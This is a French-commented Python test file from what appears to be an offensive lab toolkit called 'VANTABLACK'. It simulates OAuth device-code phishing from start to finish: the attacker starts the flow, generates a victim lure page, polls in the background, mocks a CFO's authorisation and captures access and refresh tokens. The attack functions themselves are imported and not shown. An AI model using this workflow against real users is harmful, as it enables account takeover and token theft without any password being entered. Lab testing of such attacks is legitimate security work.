"""
test_device_code.py - Test end-to-end du Device Code Phishing
==============================================================
1. L'attaquant initie un flow Device Code → reçoit user_code
2. Le poller attend en arrière-plan
3. On simule la victime qui entre le user_code
4. Le poller détecte l'autorisation et capture le token
5. Vérification : le token est bien dans le store

Usage : source .venv/bin/activate && python test_device_code.py
"""

import sys
import time

from attack.device_code import (
    get_victim_page_html,
    initiate_device_code_flow,
    start_polling,
)
from attack.oauth_consent import list_tokens


def main() -> int:
    print("=" * 70)
    print(" VANTABLACK - Test Device Code Phishing")
    print("=" * 70)

    # 1) L'attaquant initie le flow
    flow = initiate_device_code_flow()
    print("[1/5] Flow initié :")
    print(f"      user_code       = {flow.user_code}")
    print(f"      verification_uri= {flow.verification_uri}")
    print(f"      device_code     = {flow.device_code[:20]}...")
    print(f"      expires_at      = {flow.expires_at}")
    print(f"      interval        = {flow.interval}s")

    # 2) L'attaquant envoie la page victime (par email/Teams)
    page_html = get_victim_page_html(flow.user_code, flow.verification_uri)
    print(f"\n[2/5] Page victime générée ({len(page_html)} chars)")
    print(f"      contient user_code ? {flow.user_code in page_html}")

    # 3) Démarrage du poller en arrière-plan
    poller = start_polling(flow)
    print("\n[3/5] Polling démarré (attend l'autorisation de la victime)")
    time.sleep(1)  # laisser le poller faire au moins 1 tick

    # 4) La victime "autorise" le flow (labo : simulation directe)
    print(f"\n[4/5] Simulation : la victime entre '{flow.user_code}' sur le verification_uri")
    poller.authorize(user="cfo@entreprise.local")
    time.sleep(2)  # laisser le poller détecter

    # 5) Vérification des tokens capturés
    tokens = list_tokens()
    print(f"\n[5/5] Tokens capturés : {len(tokens)}")
    matching = [t for t in tokens if t.app_name == "DeviceCode Flow"]
    if matching:
        t = matching[-1]
        print(f"      ✅ user        = {t.user}")
        print(f"      ✅ app         = {t.app_name}")
        print(f"      ✅ scope       = {t.scope}")
        print(f"      ✅ refresh_eta = {t.refresh_eta()}j")
        print(f"      ✅ access_tok  = {t.access_token[:30]}...")

        print("=" * 70)
        print(" TEST Device Code RÉUSSI ✅")
        print(" L'attaquant a un token sans aucun password saisi par la victime")
        print("=" * 70)
        return 0
    else:
        print("=" * 70)
        print(" TEST Device Code ÉCHOUÉ ❌")
        print("=" * 70)
        return 1


if __name__ == "__main__":
    sys.exit(main())
